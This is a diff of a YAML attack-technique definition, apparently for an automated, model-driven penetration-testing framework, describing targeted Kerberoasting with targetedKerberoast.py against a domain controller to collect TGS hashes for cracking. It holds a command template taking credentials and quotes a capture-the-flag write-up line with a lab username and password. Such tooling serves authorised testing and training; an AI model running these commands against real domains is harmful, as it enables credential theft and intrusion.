@@ -6,8 +6,7 @@ preconditions:
 - has_cred
 parameters:
   target_ip: from_engagement.target_ip
-command_template: python3 targetedKerberoast.py -u '{username}' -p '{password}' -d
-  {domain} --dc-ip {target_ip}
+command_template: python3 targetedKerberoast.py -u '{username}' -p '{password}' -d {domain} --dc-ip {target_ip}
 parser: impacket_parser
 expected_effects:
 - tgs_hashes_obtained
@@ -16,8 +15,11 @@ falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "I show how I \u201Cinstall\u201D targetedKerberoast.py in my uv cheatsheet\
-  \ . Now I can just run it with creds asking for the hashcat format: oxdf@hacky$\
-  \ targetedKerberoast.py -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' -f hashcat\
+mechanism: "I show how I \u201Cinstall\u201D targetedKerberoast.py in my uv cheatsheet . Now I can just run it with creds\
+  \ asking for the hashcat format: oxdf@hacky$ targetedKerberoast.py -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' -f hashcat\
   \ --dc-host dc01.tombwatcher."
 hacktricks_ref: windows-hardening/active-directory-methodology/kerberoast.md
+references:
+  ocd_mindmap_node_ids:
+  - 0525ad04a8
+  - 3fd8ae74fd
